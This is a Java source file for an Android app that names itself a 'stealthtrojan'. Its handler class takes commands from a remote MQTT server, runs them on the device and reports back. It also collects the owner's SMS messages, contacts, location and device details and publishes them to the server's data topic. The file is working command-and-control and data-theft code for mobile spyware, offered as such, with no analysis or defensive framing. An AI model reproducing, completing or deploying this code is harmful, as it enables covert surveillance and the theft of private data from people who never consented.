package com.stealthtrojan.app;

import android.content.Context;
import android.util.Log;
import org.eclipse.paho.client.mqttv3.*;
import org.json.JSONObject;

public class WebSocketHandler {
    private static final String TAG = "WebSocketHandler";
    private WebSocketClient websocketClient;
    private MqttService mqttService;
    private CommandHandler commandHandler;
    private DataCollector dataCollector;

    public WebSocketHandler(Context context) {
        this.websocketClient = WebSocketClient.getInstance();
        this.mqttService = new MqttService();
        this.commandHandler = new CommandHandler(context);
        this.dataCollector = new DataCollector(context);
    }

    public void initialize() {
        try {
            mqttService.connect();
            mqttService.subscribe("stealthtrojan/#");
        } catch (MqttException e) {
            Log.e(TAG, "MQTT initialization failed", e);
        }
    }

    public void onMessageReceived(String message) {
        try {
            JSONObject jsonMessage = new JSONObject(message);
            String command = jsonMessage.getString("command");
            JSONObject params = jsonMessage.optJSONObject("params");
            commandHandler.executeCommand(command, params);

            String response = String.format(
                "{\"command\":\"%s\",\"status\":\"executed\"}", command
            );
            mqttService.publish("stealthtrojan/response", response);
        } catch (Exception e) {
            Log.e(TAG, "Message processing failed", e);
        }
    }

    public void sendData(String dataType, String data) {
        try {
            String payload = String.format(
                "{\"type\":\"%s\",\"payload\":\"%s\"}", dataType, data
            );
            mqttService.publish("stealthtrojan/data", payload);
        } catch (MqttException e) {
            Log.e(TAG, "Failed to send data: " + dataType, e);
        }
    }

    public void collectAndSendAllData() {
        String smsData = dataCollector.collectSMS();
        String contactsData = dataCollector.collectContacts();
        String locationData = dataCollector.collectLocation();
        String deviceInfo = dataCollector.collectDeviceInfo();

        sendData("SMS", smsData);
        sendData("CONTACTS", contactsData);
        sendData("LOCATION", locationData);
        sendData("DEVICE", deviceInfo);
    }

    public void disconnect() {
        try {
            mqttService.disconnect();
        } catch (MqttException e) {
            Log.e(TAG, "Disconnect failed", e);
        }
    }
}

